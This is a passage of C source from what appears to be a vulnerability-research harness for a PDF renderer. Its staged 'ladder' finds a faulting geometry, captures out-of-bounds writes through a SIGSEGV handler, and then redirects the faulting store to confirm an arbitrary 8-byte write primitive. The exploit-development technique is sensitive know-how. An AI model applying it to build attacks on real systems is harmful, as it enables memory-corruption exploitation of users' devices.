        cg_logf("[CGV] %s bytes=%zu render=%d hits=%d far=0x%llx wnr=%d insn=0x%08x rec=%d err=%s",
                vars[i].name, len, done, (int)cg_hit,
                (unsigned long long)cg_far, (int)cg_wnr, (unsigned)cg_insn,
                (int)cg_recursive, err[0] ? err : "-");

        if (cg_hit > 0) {
            win = i;
            snprintf(winName, sizeof(winName), "%s", vars[i].name);
            cg_tail_scan(cg_far);
            // Stop the sweep on the first geometry that faults. Every further
            // render would re-enter a parser whose heap the previous one left
            // damaged, and each unwind strands more live CoreFoundation state.
            cg_logf("[CGV] stopping sweep at %s", vars[i].name);
            break;
        }
    }

    if (win < 0) {
        cg_logf("[CG] verdict=NO_FAULT — the published geometry does not trip this build");
        sigaction(SIGSEGV, &oldsegv, NULL);
        if (haveBus) sigaction(SIGBUS, &oldbus, NULL);
        return;
    }
    cg_logf("[CG] trigger=%s far0=0x%llx wnr=%d insn=0x%08x", winName,
            (unsigned long long)cg_far, (int)cg_wnr, (unsigned)cg_insn);

    // ---- CG-2: capture ----
    {
        char err[128] = {0};
        size_t len = 0;
        uint8_t *pdf = cg_build_pdf(&vars[win], CG_REDIR_C0, CG_REDIR_C0,
                                    NULL, &len, err, sizeof(err));
        if (!pdf) {
            cg_logf("[CGC] build FAILED: %s", err);
        } else if (cg_write_file(pdf, len, path) != 0) {
            cg_logf("[CGC] write FAILED");
        } else {
            cg_nmap = 0; cg_mapfail = 0; cg_livepage = 0;
            cg_hit = 0; cg_far = 0; cg_pc = 0; cg_insn = 0; cg_wnr = -1;
            cg_recursive = 0;
            cg_mode = CGM_MAP;
            int done = cg_render_file(path, err, sizeof(err));
            cg_mode = CGM_OFF;
            cg_logf("[CGC] render=%d hits=%d mapped=%d live=%d mapfail=%d far=0x%llx insn=0x%08x",
                    done, (int)cg_hit, (int)cg_nmap, (int)cg_livepage, (int)cg_mapfail,
                    (unsigned long long)cg_far, (unsigned)cg_insn);

            int totalChanged = 0;
            int wantSeen = 0;
            for (int p = 0; p < cg_nmap; p++) {
                const uint8_t *b = cg_page[p];
                int changed = 0, first = -1;
                for (int k = 0; k < (int)CG_PAGE_SIZE; k++) {
                    if (b[k] != CG_MAPFILL) { if (first < 0) first = k; changed++; }
                }
                totalChanged += changed;
                cg_logf("[CGC] page[%d] addr=0x%llx changed=%d first=%d",
                        p, (unsigned long long)cg_pageaddr[p], changed, first);
                if (changed == 0) continue;
                int shown = 0;
                for (uint64_t o = 0; o + 8 <= CG_PAGE_SIZE && shown < 12; o += 8) {
                    uint64_t word;
                    memcpy(&word, b + o, 8);
                    if (word == CG_MAPFILL * 0x0101010101010101ULL) continue;
                    cg_logf("[CGC] page[%d]+0x%llx: %016llx", p,
                            (unsigned long long)o, (unsigned long long)word);
                    shown++;
                }
                for (uint64_t o = 0; o + 8 <= CG_PAGE_SIZE; o += 8) {
                    uint64_t word;
                    memcpy(&word, b + o, 8);
                    if (word == CG_REDIR_C0) { wantSeen = 1; break; }
                }
            }
            cg_logf("[CGC] changed=%d marker1e15=%d", totalChanged, wantSeen);
            if (totalChanged > 0)
                cg_logf("[CGC] *** CONTROLLED OOB WRITE — %s ***",
                        wantSeen ? "value from /C0 confirmed" : "bytes landed, value differs");
            else
                cg_logf("[CGC] handler mapped but no byte changed");

            for (int p = 0; p < cg_nmap; p++)
                munmap((void *)cg_pageaddr[p], CG_PAGE_SIZE);
            cg_nmap = 0;
        }
        if (pdf) free(pdf);
    }

    // ---- CG-3: redirect ----
    {
        // Eight pages, not one: the retargeted store is post-indexed, so after
        // the handler moves the base the loop keeps storing forward. A single
        // page could not tell "seven writes then the render unwound" from
        // "seven writes then the scratch ran out".
        enum { CG_SCR_PAGES = 8, CG_SCR_OFF = 0x800 };
        const size_t scrLen = (size_t)CG_SCR_PAGES * CG_PAGE_SIZE;
        uint8_t *scr = (uint8_t *)mmap(NULL, scrLen, PROT_READ | PROT_WRITE,
                                       MAP_ANON | MAP_PRIVATE, -1, 0);
        if (scr == MAP_FAILED) {
            cg_logf("[CGR] scratch mmap failed");
        } else {
            memset(scr, 0x5A, scrLen);
            for (int i = 0; i < 16; i++) {
                uint64_t w = CG_CANARY;
                memcpy(scr + CG_SCR_OFF + i * 8, &w, 8);
            }
            uintptr_t target = (uintptr_t)(scr + CG_SCR_OFF + 0x20);
            cg_redir_target = target;

            char err[128] = {0};
            size_t len = 0;
            uint8_t *pdf = cg_build_pdf(&vars[win], CG_REDIR_C0, CG_REDIR_C0,
                                        NULL, &len, err, sizeof(err));
            if (!pdf) {
                cg_logf("[CGR] build FAILED: %s", err);
            } else if (cg_write_file(pdf, len, path) != 0) {
                cg_logf("[CGR] write FAILED");
            } else {
                cg_hit = 0; cg_far = 0; cg_pc = 0; cg_insn = 0; cg_wnr = -1;
                cg_recursive = 0;
                cg_redir_decoded = 0; cg_redir_rn = -1; cg_redir_isreg = -1;
                cg_redir_imm = 0; cg_redir_newbase = 0; cg_redir_kind = -1;
                cg_mode = CGM_REDIR;
                int done = cg_render_file(path, err, sizeof(err));
                cg_mode = CGM_OFF;
                static const char *kname[4] = { "offset", "post", "pre", "reg" };
                int k = (int)cg_redir_kind;
                cg_logf("[CGR] render=%d hits=%d decoded=%d kind=%s rn=x%d imm=0x%llx newbase=0x%llx",
                        done, (int)cg_hit, (int)cg_redir_decoded,
                        (k >= 0 && k < 4) ? kname[k] : "none",
                        (int)cg_redir_rn, cg_redir_imm,
                        (unsigned long long)cg_redir_newbase);
                cg_logf("[CGR] far=0x%llx insn=0x%08x wnr=%d target=0x%llx",
                        (unsigned long long)cg_far, (unsigned)cg_insn, (int)cg_wnr,
                        (unsigned long long)target);

                if (!cg_redir_decoded) {
                    cg_logf("[CGR] store instruction not decoded — no redirect");
                } else {
                    // Count every slot the render wrote, not just the first 16.
                    // The span between the first and last hit is how far the
                    // walk ran after the base register was moved.
                    int hits = 0;
                    long first = -1, last = -1;
                    for (size_t o = 0; o + 8 <= scrLen; o += 8) {
                        uint64_t w;
                        memcpy(&w, scr + o, 8);
                        if (w != CG_REDIR_C0) continue;
                        if (first < 0) first = (long)o;
                        last = (long)o;
                        hits++;
                    }
                    cg_logf("[CGR] marker1e15=%d span=0x%lx..0x%lx", hits,
                            first < 0 ? 0L : first, last < 0 ? 0L : last);
                    for (int i = 0; i < 16; i++) {
                        uint64_t w;
                        memcpy(&w, scr + CG_SCR_OFF + i * 8, 8);
                        if (w == CG_CANARY) continue;
                        cg_logf("[CGR] scratch+0x%x: %016llx",
                                CG_SCR_OFF + i * 8, (unsigned long long)w);
                    }
                    if (hits > 0)
                        cg_logf("[CGR] *** ARBITRARY 8-BYTE WRITE — base register retargeted, /C0 value landed ***");
                    else
                        cg_logf("[CGR] retargeted but scratch unchanged");
                }
            }
            if (pdf) free(pdf);
            munmap(scr, scrLen);
            cg_redir_target = 0;
        }
    }

    sigaction(SIGSEGV, &oldsegv, NULL);
    if (haveBus) sigaction(SIGBUS, &oldbus, NULL);
    cg_logf("[CG] === ladder done ===");
}
